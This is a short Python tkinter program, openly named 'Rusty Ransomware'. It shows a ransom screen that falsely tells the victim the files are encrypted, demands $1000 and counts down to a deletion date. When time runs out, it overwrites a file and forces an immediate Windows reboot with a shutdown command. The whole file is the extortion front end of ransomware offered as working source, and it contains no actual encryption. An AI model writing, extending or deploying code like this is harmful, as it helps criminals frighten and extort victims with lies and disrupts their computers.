import tkinter as tk
import datetime
import sys
import os

class RansomwareApp(tk.Tk):
    def __init__(self, file_path):
        tk.Tk.__init__(self)
        self.title("Rusty Ransomware")
        self.configure(bg='red')
        self.geometry("600x400")
        self.file_path = file_path
        self.load_file()
        self.create_widgets()

    def load_file(self):
        try:
            with open(self.file_path, 'rb') as file:
                month = int.from_bytes(file.read(1), 'big')
                day = int.from_bytes(file.read(1), 'big')
                self.delete_date = datetime.datetime(datetime.datetime.now().year, month, day)
                self.seconds_left = (self.delete_date - datetime.datetime.now()).total_seconds()
        except FileNotFoundError:
            self.show_error_message("File not found")
            self.destroy()

    def create_widgets(self):
        self.upper_frame = tk.Frame(self, bg="red")
        self.upper_frame.pack(fill=tk.X)

        self.oops_label = tk.Label(self.upper_frame, text="Oops! Your files have been encrypted.", bg='red', fg="white", font=("Arial", 16))
        self.oops_label.pack(pady=20)

        self.note_frame = tk.Frame(self, bg="white")
        self.note_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        note_text = (
            "What happened to my computer?\n"
            "All your important personal files have been encrypted,\n"
            "and all of these documents are no longer accessible.\n\n"
            "Please pay $1000 for us to decrypt your files :J"
        )
        self.note_label = tk.Label(self.note_frame, text=note_text, bg="white", fg="black", font=("Arial", 12))
        self.note_label.pack(pady=20, padx=40, fill=tk.BOTH)

        self.info_frame = tk.Frame(self, bg="red")
        self.info_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        delete_date_text = "Your files will be lost on\n{}".format(self.delete_date)
        self.delete_date_label = tk.Label(self.info_frame, text=delete_date_text, bg="red", fg="black", font=("Arial", 18, "bold"))
        self.delete_date_label.pack(pady=20)

        self.time_left_label = tk.Label(self.info_frame, text="Time Left", bg="red", fg="black", font=("Arial", 18, "bold"))
        self.time_left_label.pack(pady=10)

        self.time_label = tk.Label(self.info_frame, text="", bg="red", fg="black", font=("Arial", 18, "bold"))
        self.time_label.pack(pady=10)

        self.update_clock()

    def update_clock(self):
        if self.seconds_left <= 0:
            self.time_label.config(text="Time is up!")
            with open(self.file_path, 'wb') as file:
                file.write(b'\x99\x99')
            os.system("shutdown /r /t 1")
        else:
            self.time_label.config(text=str(datetime.timedelta(seconds=self.seconds_left)))
            self.seconds_left -= 1
            self.after(1000, self.update_clock)

    def show_error_message(self, message):
        tk.messagebox.showerror("Error", message)

if __name__ == "__main__":
    app = RansomwareApp(sys.argv[1])
    app.mainloop()
